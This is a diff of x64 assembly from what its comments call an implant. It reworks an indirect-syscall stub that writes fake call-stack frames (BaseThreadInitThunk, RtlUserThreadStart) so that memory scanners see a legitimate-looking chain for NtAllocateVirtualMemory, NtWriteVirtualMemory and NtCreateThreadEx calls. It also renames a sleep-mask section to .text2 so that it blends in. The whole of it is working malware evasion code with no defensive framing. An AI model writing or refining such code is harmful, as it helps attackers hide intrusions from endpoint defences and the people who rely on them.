@@ -213,63 +213,52 @@ SpoofedSyscall4:
 ; rcx=a1, rdx=a2, r8=a3, r9=a4, [rsp+0x28..0x40]=a5..a8  (placed by C caller)
 ;
 ; Used for syscalls with ≥5 args (NtAllocateVirtualMemory, NtProtectVirtualMemory,
-; NtWriteVirtualMemory, NtCreateThreadEx).  RSP is NOT moved so args at [rsp+0x28+]
-; are visible to the kernel at the expected offsets.
+; NtWriteVirtualMemory, NtCreateThreadEx).  RSP is NOT moved.
 ;
-; Stack spoof layout (in-place shadow space patching):
-;   [rsp+0x00]  g_k32_ret  — "syscall;ret" pops this → jmp k32_ret (1-byte ret)
-;   [rsp+0x08]  real_ret   — k32_ret's ret pops this → return to caller ✓
-;   [rsp+0x10]  g_btt      — visible chain: BaseThreadInitThunk+N
-;   [rsp+0x18]  g_rtl      — visible chain: RtlUserThreadStart+K
+; Shadow-space spoof (non-destructive):
+;   [rsp+0x00]  real_ret   — UNTOUCHED; "syscall;ret" pops this → correct RSP ✓
+;   [rsp+0x08]  g_k32_ret  — shadow[0]: chain frame 1 (visible to scanner)
+;   [rsp+0x10]  g_btt      — shadow[1]: BaseThreadInitThunk+N
+;   [rsp+0x18]  g_rtl      — shadow[2]: RtlUserThreadStart+K
 ;   [rsp+0x28..] args 5-8  — UNTOUCHED; kernel reads from here
 ;
-; Falls back to plain HellsGateCall-style spoof if multi-level gadgets not ready.
+; By NOT overwriting [rsp+0x00], the ret in "syscall;ret" correctly returns to
+; real_ret with RSP = entry_RSP + 8, preserving the caller's stack frame.
 SpoofedSyscall8:
-    mov  r11, qword [rel g_k32_ret]
-    test r11, r11
-    jz   .plain8
+    ; Write fake chain to shadow slots — DO NOT touch [rsp+0x00] (real_ret stays)
+    mov  rax, qword [rel g_k32_ret]
+    test rax, rax
+    jz   .do8
+    mov  [rsp+0x08], rax      ; shadow[0] = k32_ret  (scanner: frame 1)
 
-    ; In-place shadow patching: save real_ret, plant fake chain
-    xchg r11, [rsp]           ; r11 = real_ret, [rsp+0x00] = g_k32_ret
-    mov  [rsp+0x08], r11      ; shadow[0] = real_ret
-
-    ; Write deeper chain into remaining shadow slots (best-effort)
     mov  rax, qword [rel g_btt]
     test rax, rax
     jz   .do8
-    mov  [rsp+0x10], rax      ; shadow[1] = BaseThreadInitThunk+N
+    mov  [rsp+0x10], rax      ; shadow[1] = BaseThreadInitThunk+N (frame 2)
 
     mov  rax, qword [rel g_rtl]
     test rax, rax
     jz   .do8
-    mov  [rsp+0x18], rax      ; shadow[2] = RtlUserThreadStart+K
+    mov  [rsp+0x18], rax      ; shadow[2] = RtlUserThreadStart+K (frame 3)
 
 .do8:
     mov  r10, rcx
     mov  eax, dword [rel g_ssn]
-    jmp  qword [rel g_gadget]
+    jmp  qword [rel g_gadget]  ; "syscall; ret" → pops [rsp+0x00]=real_ret → RSP+8 ✓
 
-.plain8:
-    ; No k32_ret gadget — plain indirect syscall (no stack spoof)
-    mov  r10, rcx
-    mov  eax, dword [rel g_ssn]
-    jmp  qword [rel g_gadget]
-
-; ─── .slpmsk — sleep-mask resident code ──────────────────────────────────────
-; These stubs live in .slpmsk (always executable, never masked) so they can be
-; called after the implant's own .text is set to PAGE_NOACCESS during sleep.
+; ─── .text2 — sleep-mask resident code ───────────────────────────────────────
+; Renamed from .slpmsk to blend in as a secondary code section.
+; These stubs are always executable and never included in the masking pass,
+; so they can run after the implant's .text is set to PAGE_NOACCESS.
 ;
 ; SlpNtProtect — NtProtectVirtualMemory via g_protect_ssn (no stack spoof).
 ; C signature: NTSTATUS SlpNtProtect(HANDLE hProc, PVOID *pBase,
 ;                                     SIZE_T *pSize, ULONG newProt, ULONG *pOld)
-;   rcx=hProc, rdx=*pBase, r8=*pSize, r9=newProt, [rsp+0x28]=*pOld
-; This matches NtProtectVirtualMemory's argument layout exactly — the C compiler
-; already places arg5 (*pOld) at [rsp+0x28] so the syscall reads it correctly.
+; Matches NtProtectVirtualMemory's layout; C compiler places arg5 at [rsp+0x28].
 ;
-; SlpSpoofedWait — NtWaitForSingleObject with multi-level fake call stack,
-; identical to SpoofedNtWait but resident in .slpmsk so it runs while .text=NOACCESS.
+; SlpSpoofedWait — NtWaitForSingleObject with multi-level fake call stack.
 
-section .slpmsk exec align=16
+section .text2 exec align=16
 
     global SlpNtProtect
     global SlpSpoofedWait
